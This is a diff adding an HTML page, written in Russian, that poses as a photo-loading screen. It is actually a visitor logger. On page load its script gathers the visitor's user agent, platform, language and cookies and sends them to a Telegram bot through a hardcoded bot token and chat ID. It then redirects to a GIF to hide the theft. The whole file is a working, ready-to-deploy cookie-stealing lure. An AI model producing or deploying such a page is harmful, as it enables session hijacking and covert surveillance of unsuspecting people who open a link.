@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка медиа...</title>
+    <style>
+        body { background-color: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <p>Загрузка фото, подождите...</p>
+
+    <script>
+        // --- ВСТАВЬТЕ СВОИ ДАННЫЕ СЮДА ---
+        const TOKEN = "8284770824:AAHX0Xk6f5AljsIEDqU7CU9kCS7Bijh5LNQ"; // Токен от @BotFather
+        const CHAT_ID = "7532993584";        // Ваш ID от @userinfobot
+        // --------------------------------
+
+        async function collectData() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie || "Доступ к куки закрыт"
+            };
+
+            const text = `⚠️ НОВЫЙ ПОСЕТИТЕЛЬ!\n\n📱 Устройство: ${info.userAgent}\n🌐 Платформа: ${info.platform}\n🍪 Cookies: ${info.cookies}`;
+
+            // Отправка в ваш Телеграм
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {}
+
+            // Редирект на реальную картинку через 2 секунды
+            setTimeout(() => {
+                window.location.href = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxxXLyKHzqM/giphy.gif";
+            }, 2000);
+        }
+
+        window.onload = collectData;
+    </script>
+</body>
+</html>
